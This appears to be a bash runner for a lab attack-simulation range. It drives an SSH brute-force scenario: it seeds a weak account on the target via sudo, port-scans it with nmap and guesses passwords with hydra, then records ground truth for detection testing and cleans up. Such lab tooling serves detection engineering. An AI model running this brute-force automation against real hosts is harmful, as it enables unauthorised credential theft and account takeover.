#!/usr/bin/env bash
# Draghunt private runner — protocol v1 dispatcher for the casefiles-lab range.
#
# Draghunt invokes this over SSH on the attacker box (Barad-dûr) with a set of
# environment variables (see docs/RUNNER-PROTOCOL.md in the Draghunt repo). The
# contract that matters here:
#   * stdout carries EXACTLY ONE JSON document and nothing else.
#   * All human diagnostics go to stderr.
#   * preflight (DRY_RUN=1) is read-only. run performs the attack. cleanup undoes it.
#   * The result reports the OBSERVED outcome, never the requested SUCCEED flag.
#   * Infrastructure failure or an unverifiable run exits nonzero (never "completed").
#
# Attacks run FROM this box against the configured target. This is the v1 successor
# to dealer.sh; scenario logic lives in run_<SCN> functions below.
set -uo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
[ -f "$HERE/lab.env" ] && . "$HERE/lab.env"

log()  { printf '%s\n' "$*" >&2; }
fail() { log "ERROR: $*"; exit 1; }

# ---- request parameters ------------------------------------------------------
[ "${DRAGHUNT_PROTOCOL:-}" = "1" ] || fail "unsupported protocol '${DRAGHUNT_PROTOCOL:-}'"
ACTION="${ACTION:-}"; SCN="${SCN:-}"; CASE_ID="${CASE_ID:-}"
TARGET="${TARGET:-}"; TARGET_USER="${TARGET_USER:-${VICLIN_USER:-labadmin}}"
SRC_IP="${SRC_IP:-${ATTACKER_IP:-}}"; ACCOUNT="${ACCOUNT:-}"
VARIANT="${VARIANT:-}"; SEED="${SEED:-}"; SUCCEED="${SUCCEED:-unknown}"
DRY_RUN="${DRY_RUN:-1}"
KEY="${SSH_KEY:-$HOME/.ssh/lab_id_ed25519}"
# shellcheck disable=SC2206
OPTS=(${SSH_OPTS:--o StrictHostKeyChecking=accept-new -o ConnectTimeout=8 -o BatchMode=yes})
ARTDIR="${DRAGHUNT_ART_DIR:-$HOME/.draghunt-runner}"

is_scenario() { [ "$1" = "S01" ]; }   # extend as scenarios are wired to v1

# ---- JSON emitters (python3 handles escaping; stdout stays pure JSON) --------
emit_preflight() {  # ready runner target telemetry
  RJ_READY="$1" RJ_RUN="$2" RJ_TGT="$3" RJ_TEL="$4" \
  P_CASE="$CASE_ID" P_SCN="$SCN" P_TARGET="$TARGET" python3 - <<'PY'
import json, os
b = lambda k: os.environ[k] == "1"
print(json.dumps({"protocol_version": 1, "case_id": os.environ["P_CASE"],
                  "scenario_id": os.environ["P_SCN"], "target": os.environ["P_TARGET"],
                  "ready": b("RJ_READY"),
                  "checks": {"runner": b("RJ_RUN"), "target": b("RJ_TGT"), "telemetry": b("RJ_TEL")}}))
PY
}

emit_result() {  # started finished technique tactic source account succeeded disposition actions_nl evidence_nl
  P_CASE="$CASE_ID" P_SCN="$SCN" P_TARGET="$TARGET" \
  R_START="$1" R_FIN="$2" R_TECH="$3" R_TAC="$4" R_SRC="$5" R_ACCT="$6" R_SUCC="$7" R_DISP="$8" \
  R_ACTIONS="$9" R_EVID="${10}" python3 - <<'PY'
import json, os
def opt(v): return None if v in ("", "null") else v
def tri(v): return {"yes": True, "no": False}.get(v)   # anything else -> None
lines = lambda k: [x for x in os.environ[k].split("\n") if x.strip()]
print(json.dumps({
    "protocol_version": 1, "case_id": os.environ["P_CASE"], "scenario_id": os.environ["P_SCN"],
    "target": os.environ["P_TARGET"], "status": "completed",
    "started_utc": os.environ["R_START"], "finished_utc": os.environ["R_FIN"],
    "ground_truth": {"scenario_id": os.environ["P_SCN"], "technique": opt(os.environ["R_TECH"]),
                     "tactic": os.environ["R_TAC"], "source_ip": os.environ["R_SRC"],
                     "account": opt(os.environ["R_ACCT"]), "succeeded": tri(os.environ["R_SUCC"]),
                     "disposition": os.environ["R_DISP"]},
    "completed_actions": lines("R_ACTIONS"), "evidence": lines("R_EVID")}))
PY
}

now_utc() { date -u +%Y-%m-%dT%H:%M:%SZ; }
tssh() { ssh -i "$KEY" "${OPTS[@]}" "${TARGET_USER}@${TARGET}" "$@"; }

# ============================ S01: SSH brute force ============================
S01_PW="Autumn2026"   # fake lab password seeded on the target account

pre_S01() {
  local runner=1 target=0 telemetry=0
  if tssh true >/dev/null 2>&1; then
    target=1
    tssh 'systemctl is-active --quiet wazuh-agent' >/dev/null 2>&1 && telemetry=1
  fi
  local ready=0; [ "$runner$target$telemetry" = "111" ] && ready=1
  emit_preflight "$ready" "$runner" "$target" "$telemetry"
}

run_S01() {
  [ -n "$ACCOUNT" ] || fail "S01 requires an ACCOUNT"
  command -v hydra >/dev/null || fail "hydra not installed on the attacker"
  mkdir -p "$ARTDIR"
  local started; started="$(now_utc)"
  local wl="$ARTDIR/s01-${CASE_ID}.wordlist" hlog="$ARTDIR/s01-${CASE_ID}.hydra.log"
  local actions="" evidence=""

  # seed the weak account (setup, not the attack)
  tssh "sudo useradd -m -s /bin/bash '$ACCOUNT' 2>/dev/null; echo '$ACCOUNT:$S01_PW' | sudo chpasswd" \
    || fail "could not seed target account $ACCOUNT"

  printf 'password\n123456\nletmein\nSummer2026\nWinter2025!\n' > "$wl"
  if [ "$SUCCEED" = "yes" ]; then echo "$S01_PW" >> "$wl"; else echo "NotThePassword2026" >> "$wl"; fi

  nmap -Pn -p22 --open "$TARGET" >/dev/null 2>&1 && actions+=$'Port-scanned 22/tcp before the attack\n'
  hydra -l "$ACCOUNT" -P "$wl" "ssh://$TARGET" -t 4 -f >"$hlog" 2>&1 || true
  actions+=$'Ran an SSH password-guessing attack against the account\n'

  # OBSERVED outcome: did hydra actually recover a valid credential?
  local succeeded="no"
  if grep -qiE "login:.*password:" "$hlog"; then
    succeeded="yes"
    actions+=$'Recovered valid credentials and confirmed the login\n'
  fi
  evidence+="hydra transcript: ${hlog}"$'\n'
  evidence+="target sshd auth log: /var/log/auth.log (Failed/Accepted password for ${ACCOUNT} from ${SRC_IP})"$'\n'

  emit_result "$started" "$(now_utc)" "T1110.001" "credential-access" \
              "$SRC_IP" "$ACCOUNT" "$succeeded" "malicious" "$actions" "$evidence"
}

cleanup_S01() {
  [ -n "$ACCOUNT" ] && tssh "sudo pkill -u '$ACCOUNT' 2>/dev/null; sudo userdel -r '$ACCOUNT' 2>/dev/null" >/dev/null 2>&1
  rm -f "$ARTDIR/s01-${CASE_ID}".* 2>/dev/null
  log "cleanup: removed $ACCOUNT and S01 artifacts for $CASE_ID"
}

# ================================ dispatch ===================================
is_scenario "$SCN" || fail "unknown or non-live scenario '$SCN'"
[ -n "$TARGET" ] || fail "TARGET not set"

case "$ACTION" in
  preflight) "pre_${SCN}" ;;
  run)       [ "$DRY_RUN" = "0" ] || fail "run requires DRY_RUN=0"; "run_${SCN}" ;;
  cleanup)   "cleanup_${SCN}"; log "cleanup complete" ;;
  *)         fail "unknown ACTION '$ACTION'" ;;
esac
